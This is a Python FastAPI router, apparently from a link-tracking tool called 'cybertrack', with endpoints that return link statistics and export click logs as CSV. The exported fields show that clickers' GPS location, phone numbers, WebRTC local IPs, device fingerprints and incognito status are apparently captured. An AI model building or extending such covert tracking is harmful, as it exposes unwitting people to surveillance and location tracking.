import csv
import io
from fastapi import APIRouter
from fastapi.responses import Response
from services.link_service import get_link_stats, get_logs_for_link

router = APIRouter()


@router.get("/api/stats/{link_id}")
async def get_stats(link_id: str):
    """Return aggregated analytics for a tracking link."""
    stats = get_link_stats(link_id)
    return stats


@router.get("/api/stats/{link_id}/export")
async def export_csv(link_id: str):
    """Export all tracking logs for a link as a downloadable CSV file."""
    logs = get_logs_for_link(link_id)
    if not logs:
        return Response(content="No logs found", media_type="text/plain")

    fieldnames = [
        "clicked_at", "ip_address", "country", "city", "isp",
        "device_brand", "device_model", "chipset", "os", "browser",
        "captured_phone", "gps_lat", "gps_lng", "gps_accuracy",
        "canvas_hash", "webrtc_local_ip", "battery_level", "proxy", "is_incognito"
    ]

    output = io.StringIO()
    writer = csv.DictWriter(output, fieldnames=fieldnames, extrasaction="ignore")
    writer.writeheader()
    for row in logs:
        writer.writerow(row)

    return Response(
        content=output.getvalue(),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename=cybertrack_logs_{link_id[:8]}.csv"}
    )
